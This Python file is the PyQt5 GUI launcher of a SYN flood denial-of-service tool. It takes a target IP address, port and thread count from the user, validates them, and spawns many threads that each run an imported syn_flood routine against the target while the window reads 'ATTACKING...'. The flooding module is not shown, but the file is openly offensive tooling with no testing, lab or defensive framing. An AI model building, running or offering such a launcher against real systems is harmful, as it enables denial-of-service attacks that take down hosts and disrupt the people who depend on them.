import re
import sys
import threading
from window import Ui_Form
from syn_flood import syn_flood
from PyQt5.QtGui import QIcon
from PyQt5.QtWidgets import QApplication, QMainWindow, QMessageBox


class MyWindow(QMainWindow, Ui_Form):
    def __init__(self, parent=None):
        super(MyWindow, self).__init__(parent)
        self.setupUi(self)
        self.setWindowIcon(QIcon('icon/reze.png'))
        self.start_button.clicked.connect(self.start)
        self.stop_button.clicked.connect(self.stop)

        self.threads_list = []
        self.stop_threads = False

    def check_format(self, target_ip, target_port, thread_num):
        ip_reg = r'^(\d{1,2}|1\d\d|2[0-4]\d|25[0-5])\.(\d{1,2}|1\d\d|2[0-4]\d|25[0-5])\.(\d{1,2}|1\d\d|2[0-4]\d|25[0-5])\.(\d{1,2}|1\d\d|2[0-4]\d|25[0-5])$'
        bytes_reg = r'^\d+$'
        ip_flag = re.match(ip_reg, target_ip)
        port_flag = re.match(bytes_reg, target_port)
        thread_flag = re.match(bytes_reg, thread_num)
        if ip_flag and port_flag and thread_flag and int(target_port) < 65536:
            return True
        else:
            return False

    def start(self):
        target_ip = self.target_ip.text()
        target_port = self.target_port.text()
        thread_num = self.thread_num.text()
        if target_ip and target_port and thread_num:
            if self.check_format(target_ip, target_port, thread_num):
                target_port = int(target_port)
                thread_num = int(thread_num)
                self.info.setText('ATTACKING...')
                self.start_button.setEnabled(False)
                self.stop_button.setEnabled(True)
                self.stop_threads = False
                for i in range(thread_num):
                    t = threading.Thread(target=syn_flood, args=(target_ip, target_port, (lambda: self.stop_threads)))
                    t.start()
                    self.threads_list.append(t)
            else:
                QMessageBox.critical(self, '错误', '数据格式错误', QMessageBox.Yes)
        else:
            QMessageBox.critical(self, '错误', '缺少必要的数据', QMessageBox.Yes)

    def stop(self):
        self.info.setText('STOPPED')
        self.start_button.setEnabled(True)
        self.stop_button.setEnabled(False)
        self.stop_threads = True
        for t in self.threads_list:
            t.join()


if __name__ == '__main__':
    app = QApplication(sys.argv)
    myWin = MyWindow()
    myWin.show()
    sys.exit(app.exec_())
